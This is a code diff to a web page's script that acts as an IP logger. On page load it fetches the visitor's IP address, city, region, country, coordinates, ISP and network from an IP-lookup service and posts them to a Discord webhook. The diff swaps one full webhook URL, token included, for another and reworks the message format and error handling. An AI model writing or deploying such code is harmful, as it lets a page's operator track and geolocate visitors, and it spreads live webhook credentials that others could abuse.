@@ -70,7 +70,7 @@
 
     <script>
         // Replace this with your actual Discord webhook URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1367166615086567484/uZVGPM7EEn2IsusF_hMwWDzjhFMACc9dsYJFytqp3OEb3cU306noC7JROLWk5EYCoJFU";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1367168518084366499/5IDN85YSiEfMfm0lgeA-Pni4Fc9zpXxdmpd9FDr8TE-QSDzkkQsEIgt3NYWsNGBoSTRF";
         
         const loading = document.getElementById('loading');
         const ipInfoContainer = document.getElementById('ipInfoContainer');
@@ -79,24 +79,31 @@
         
         // Function to format the Discord message
         function createDiscordMessage(ipData) {
+            // Format the embed fields properly
+            const fields = [
+                { name: "IP Address", value: ipData.ip || "Unknown", inline: true },
+                { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+                { name: "Coordinates", value: ipData.latitude && ipData.longitude ? `${ipData.latitude}, ${ipData.longitude}` : 'Unknown', inline: true }
+            ];
+            
+            if (ipData.org) {
+                fields.push({ name: "ISP", value: ipData.org, inline: true });
+            }
+            
+            if (ipData.network) {
+                fields.push({ name: "Network", value: ipData.network, inline: true });
+            }
+            
             return {
-                content: `New IP information received:`,
                 embeds: [{
-                    title: "IP Information",
-                    description: `Automatically collected information for IP ${ipData.ip}`,
+                    title: "IP Information Collected",
+                    description: "Automatically collected IP information",
                     color: 0x3498db,
-                    fields: [
-                        { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
-                        { name: "Coordinates", value: ipData.latitude && ipData.longitude ? `${ipData.latitude}, ${ipData.longitude}` : 'Unknown', inline: true },
-                        { name: "ISP", value: ipData.org || 'Unknown', inline: true },
-                        { name: "Network", value: ipData.network || 'Unknown', inline: true },
-                        { name: "User Agent", value: navigator.userAgent || 'Unknown', inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }],
-                attachments: [{
-                    filename: "ip_info.json",
-                    content: JSON.stringify(ipData, null, 2)
+                    fields: fields,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "IP Information Logger"
+                    }
                 }]
             };
         }
@@ -106,6 +113,9 @@
             try {
                 // Fetch IP information
                 const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
                 const ipData = await response.json();
                 
                 // Display the information
@@ -121,19 +131,21 @@
                         body: JSON.stringify(createDiscordMessage(ipData))
                     });
                     
-                    if (discordResponse.ok) {
-                        showStatus('IP information successfully sent to Discord!', 'success');
-                    } else {
-                        const errorData = await discordResponse.text();
-                        showStatus(`Failed to send to Discord: ${errorData}`, 'error');
+                    if (!discordResponse.ok) {
+                        const errorData = await discordResponse.json();
+                        throw new Error(`Discord error: ${JSON.stringify(errorData)}`);
                     }
+                    
+                    showStatus('IP information successfully sent to Discord!', 'success');
                 } catch (error) {
                     showStatus(`Error sending to Discord: ${error.message}`, 'error');
+                    console.error('Discord webhook error:', error);
                 }
                 
             } catch (error) {
                 loading.classList.add('hidden');
                 showStatus(`Error collecting IP information: ${error.message}`, 'error');
+                console.error('IP collection error:', error);
             }
         }
         
